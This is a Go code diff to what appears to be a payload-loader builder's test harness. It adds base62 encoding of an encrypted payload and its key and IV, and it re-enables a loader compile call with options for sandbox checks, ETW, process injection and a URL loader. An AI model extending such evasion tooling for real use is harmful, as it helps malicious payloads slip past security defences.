@@ -124,6 +124,11 @@ func main() {
 	b64key := base64.StdEncoding.EncodeToString(key)
 	b64iv := base64.StdEncoding.EncodeToString(iv)
 
+	// Encode to base 62
+	b62ciphertext := Base62.Encode(string(cipherText))
+	b62key := Base62.Encode(string(key))
+	b62iv := Base62.Encode(string(iv))
+
 	// create a fake opt struct to pass to execute
 	fakeOpt := FlagOptions{
 		outFile:          "testfile",
@@ -143,8 +148,15 @@ func main() {
 
 	// Loads our bin file and sets the compile to control with all disabled feature flags
 	// TODO : Load via struct
-	name, _ := Loader.CompileFile(b64ciphertext, b64key, b64iv, fakeOpt.LoaderType, fakeOpt.outFile, fakeOpt.refresher, fakeOpt.console, fakeOpt.sandbox, fakeOpt.ETW, fakeOpt.ProcessInjection, false)
+	encodeType := "b62"
+	name, filename := "", ""
 
+	if encodeType == "b64" {
+		name, filename = Loader.CompileFile(b64ciphertext, b64key, b64iv, fakeOpt.LoaderType, fakeOpt.outFile, fakeOpt.refresher, fakeOpt.console, fakeOpt.sandbox, fakeOpt.ETW, fakeOpt.ProcessInjection, false)
+	} else if encodeType == "b62" {
+		// base62 encode
+		name, filename = Loader.CompileFile(b62ciphertext, b62key, b62iv, fakeOpt.LoaderType, fakeOpt.outFile, fakeOpt.refresher, fakeOpt.console, fakeOpt.sandbox, fakeOpt.ETW, fakeOpt.ProcessInjection, false)
+	}
 	// execute requires the pointer for opt
 	name = execute(&fakeOpt, name)
 
@@ -152,6 +164,9 @@ func main() {
 	fmt.Println(Base62.Encode("SIMPLE"))
 	encoded := Base62.Encode("SIMPLE")
 	fmt.Println(Base62.Decode(encoded))
+	insert := `somevalue`
+	concat := `Backtick` + insert + `here`
+	fmt.Println(concat)
 
-	// Loader.CompileLoader(fakeOpt.LoaderType, fakeOpt.outFile, filename, name, fakeOpt.CommandLoader, fakeOpt.URL, fakeOpt.sandbox)
+	Loader.CompileLoader(fakeOpt.LoaderType, fakeOpt.outFile, filename, name, fakeOpt.CommandLoader, fakeOpt.URL, fakeOpt.sandbox)
 }
